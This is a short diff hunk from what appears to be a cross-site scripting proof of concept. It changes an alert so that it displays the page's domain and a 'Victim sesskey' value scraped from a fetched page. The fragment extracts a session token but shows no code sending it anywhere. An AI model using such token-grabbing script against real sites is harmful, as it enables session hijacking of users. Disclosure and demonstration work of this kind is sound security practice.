@@ -25,7 +25,7 @@
       sesskey = m2 ? m2[1] : null;
     }
 
-    alert(sesskey ?? 'sesskey not found');
+    alert('document.domain: '+document.domain+'\nVictim sesskey: '+sesskey);
   } catch (err) {
     alert('Error fetching/parsing page: ' + err.message);
   }
